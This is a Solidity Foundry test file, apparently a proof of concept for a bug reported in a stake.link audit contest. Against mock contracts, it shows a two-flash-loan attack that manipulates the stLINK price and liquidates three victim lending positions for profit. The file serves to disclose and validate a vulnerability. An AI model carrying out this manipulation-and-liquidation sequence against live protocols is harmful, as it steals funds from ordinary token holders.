//SPDX-License-Identifier: MIT

pragma solidity 0.8.23;

import {Test, console} from "forge-std/Test.sol";
import {MockPriorityPool} from "../../src/stakelink/MockPriorityPool.sol";
import {MockStakingPool} from "../../src/stakelink/MockStakingPool.sol";
import {FlashLoanProvider} from "../../src/flashloan/FlashLoanProvider.sol";
import {FlashLoanConsumerOne} from "../contracts/FlashLoanConsumerOne.sol";
import {FlashLoanConsumerTwo} from "../contracts/FlashLoanConsumerTwo.sol";
import {PoolFactory} from "../../src/exchange/PoolFactory.sol";
import {Pool} from "../../src/exchange/Pool.sol";
import {LendingProtocol} from "../../src/lending/LendingProtocol.sol";
import {MockERC20} from "../../lib/solady/test/utils/mocks/MockERC20.sol";

contract BaseTest is Test {
    MockPriorityPool mockPrio;
    MockStakingPool mockStaking;
    FlashLoanProvider flashLoan;
    FlashLoanConsumerOne attackerOne;
    FlashLoanConsumerTwo attackerTwo;
    Pool poolLinkStlink;
    Pool poolLinkUSDC;
    LendingProtocol lending;
    // Create Staked Chainlink token
    MockERC20 lst = new MockERC20("STAKED LINK", "stLINK", 18);
    // Create Chainlink token
    MockERC20 token = new MockERC20("CHAINLINK", "LINK", 18);
    // Create a Mock USDC
    MockERC20 usdc = new MockERC20("USDC", "USDC", 18);
    address victim1 = makeAddr("victim1");
    address victim2 = makeAddr("victim2");
    address victim3 = makeAddr("victim3");

    bytes[] _data;

    // Stuff used
    uint256 normalize = 1e18;
    uint256 amountToSwap;

    /*
     * The amounts for liquidity etc. in this test are arbitrary. This test is only to prove beyond doubt that
     * my proposed attack vector from finding 1008 in the stake.link contest is valid. As mentioned in my original report
     * this bug does NOT exist under all circumstances, the return value of StakingPool::canDeposit would need to be big enough
     * to move the price of stLink in the attackers favor. This test aims to provide the attack path, if proposed conditions are met,
     * to validate that the root cause is within the stake.link contracts and that regular user/holders of stLink would be directly at harm.
     */

    function setUp() public {
        // Create Simplified PriorityPool
        mockPrio = new MockPriorityPool(address(token));
        // Create Simplified StakingPool
        mockStaking = new MockStakingPool(address(mockPrio), address(token), address(lst));
        // setting spending allowance between the pools
        vm.prank(address(mockPrio));
        token.approve(address(mockStaking), type(uint256).max);
        // Simplified init of PriorityPool
        mockPrio.initializeMockStakingPool(address(mockStaking));
        // Deploy needed DeFi Projects
        // 1. FlashLoan Provider
        //// Creating the contract
        flashLoan = new FlashLoanProvider(address(usdc));
        //// Funding the contract
        address flashLoanLP = makeAddr("flashLoanLP");
        usdc.mint(flashLoanLP, type(uint152).max);
        vm.startPrank(flashLoanLP);
        usdc.approve(address(flashLoan), type(uint152).max);
        // flashLoan.deposit(usdc, type(uint152).max);
        usdc.mint(address(flashLoan), type(uint152).max);
        vm.stopPrank();
        //// Setting up the attackers
        ////// attackerOne is responsible for staking link and using the stLink to manipulate the Price
        attackerOne = new FlashLoanConsumerOne(
            mockPrio, poolLinkStlink, mockStaking, flashLoan, address(token), address(token), address(token)
        );
        ////// attackerTwo is responsible for using the manipulated Price to Harm stLink users while making a profit
        attackerTwo = new FlashLoanConsumerTwo(flashLoan);
        // 2. DEX Provider Set Up
        //// Initialize the Pools
        poolLinkStlink = new Pool(address(lst), address(token), "STAKED CHAINLINK", "stLINK");
        poolLinkUSDC = new Pool(address(usdc), address(token), "usdc", "usdc");
        //// Initialize Funding to the Pools
        address lp = makeAddr("lp");
        lst.mint(lp, 1000000e18);
        token.mint(lp, 2000000e18);
        usdc.mint(lp, 1100000e18);
        vm.startPrank(lp);
        lst.approve(address(poolLinkStlink), type(uint256).max);
        token.approve(address(poolLinkStlink), type(uint256).max);
        token.approve(address(poolLinkUSDC), type(uint256).max);
        usdc.approve(address(poolLinkUSDC), type(uint256).max);
        poolLinkStlink.deposit(100000e18, 100000e18, 100000e18, uint64(block.timestamp));
        poolLinkUSDC.deposit(110000e18, 100000e18, 100000e18, uint64(block.timestamp));
        vm.stopPrank();
        // 3. Lending Protocol
        lending = new LendingProtocol(poolLinkStlink, address(usdc), address(lst), address(token));
        usdc.mint(address(lending), type(uint184).max);

        //// seting up user accounts depositing LST to loan USDC in return
        //// victims are assumed as users which deposited LINK and received stLink in return

        token.mint(victim1, 100e18);
        vm.startPrank(victim1);
        token.approve(address(mockPrio), type(uint256).max);
        mockPrio.deposit(victim1, 100e18, false, _data);
        lst.approve(address(lending), type(uint256).max);
        lending.deposit(lst.balanceOf(victim1));
        lending.takeLoan();
        vm.stopPrank();

        token.mint(victim2, 1000e18);
        vm.startPrank(victim2);
        token.approve(address(mockPrio), type(uint256).max);
        mockPrio.deposit(victim2, 1000e18, false, _data);
        lst.approve(address(lending), type(uint256).max);
        lending.deposit(lst.balanceOf(victim2));
        lending.takeLoan();
        vm.stopPrank();

        token.mint(victim3, 10000e18);
        vm.startPrank(victim3);
        token.approve(address(mockPrio), type(uint256).max);
        mockPrio.deposit(victim3, 10000e18, false, _data);
        lst.approve(address(lending), type(uint256).max);
        lending.deposit(lst.balanceOf(victim3));
        lending.takeLoan();
        vm.stopPrank();
    }

    function test_exploitLstMint() public {
        vm.warp(1);
        // Here attacker one takes out flashloan 1, swaps it into Link and
        // deposit it into stake.link minting stLink
        vm.startPrank(address(attackerOne));
        usdc.approve(address(poolLinkUSDC), type(uint256).max);
        token.approve(address(poolLinkUSDC), type(uint256).max);
        usdc.approve(address(flashLoan), type(uint256).max);
        token.approve(address(mockPrio), type(uint256).max);
        vm.stopPrank();
        attackerOne._takeFlashLoan(10000000e18);
        vm.startPrank(address(attackerOne));
        usdc.approve(address(poolLinkUSDC), type(uint256).max);
        poolLinkUSDC.swapExactInput(usdc, 10000000e18, token, 0, uint64(block.timestamp));
        mockPrio.deposit(address(attackerOne), token.balanceOf(address(attackerOne)), false, _data);
        vm.stopPrank();
        // The attacker here takes the 2nd Flashloan, the amount will here be used to
        // liquidate users of stLink of lending plattforms. This is as mentioned in my report only on
        // piece of the profitability, the logic can be extended into opening short positions of
        // stLink, opening liquidity positions on exchanges (which would than of course be withdrawn before flashloan 1 reverts) etc.
        // There are essentially many ways to profit within the DeFi ecosystem from falling token prices.
        // This test though, primarly aims to prove that proposed scenario is possible, directly harms the users and the root cause
        // is within the deposit chain of the stake.link contracts.
        // Setting a variable to track and logging it to confirm
        uint256 startingBalance = usdc.balanceOf(address(attackerTwo));
        console.log("Initial USDC balance of attacker: ", startingBalance);
        vm.startPrank(address(attackerTwo));
        attackerTwo._takeFlashLoan(10000e18);
        vm.stopPrank();
        // Here the manipulation happens. After this piece we are able to liquidate existing user on leding plattforms
        // from the 2nd flashloanConsumer, and use other options of profitability as mentioned above.
        vm.startPrank(address(attackerOne));
        lst.approve(address(poolLinkStlink), type(uint256).max);
        poolLinkStlink.swapExactInput(lst, lst.balanceOf(address(attackerOne)), token, 0, uint64(block.timestamp));
        vm.stopPrank();
        // Execute Liquidation Logic of other users
        vm.startPrank(address(attackerTwo));
        lending.liquidate(victim1);
        lending.liquidate(victim2);
        lending.liquidate(victim3);
        vm.stopPrank();
        // Here we let the first flashloan revert, which is actually better than using the StakingPool::donate function
        // since we have a higher profit. Remember that we can not withdraw donated tokens
        // the transaction of flashloan1 is independant from flashloan2 and we already achieved what we wanted, so a revert is okay.
        vm.expectRevert();
        attackerOne._repayFlashLoan(100e18);
        // Now we swap the Liquidated LSTs via the stLink/Link and USDC/Link pools into USDC
        // to make sure we have enough money  to pay back the loan at the end.
        // Note that at this point, we already set the Link/stLink pool back into it's original state, by letting flashloan 1 revert.
        vm.startPrank(address(attackerTwo));
        lst.approve(address(poolLinkStlink), type(uint256).max);
        token.approve(address(poolLinkUSDC), type(uint256).max);
        usdc.approve(address(flashLoan), type(uint256).max);
        poolLinkStlink.swapExactInput(lst, lst.balanceOf(address(attackerTwo)), token, 0, uint64(block.timestamp));
        poolLinkUSDC.swapExactInput(token, token.balanceOf(address(attackerTwo)), usdc, 0, uint64(block.timestamp));
        attackerTwo._repayFlashLoan(10000e18);
        vm.stopPrank();
        uint256 endingBalance = usdc.balanceOf(address(attackerTwo));
        // Warp into the next block to make sure everything is really settled.
        vm.warp(2);
        // Final Check, the thing which matters: Did we make USDC?
        assert(endingBalance > startingBalance);
        console.log("Attackers Ending USDC balance: ", endingBalance / 1e18);
    }
}
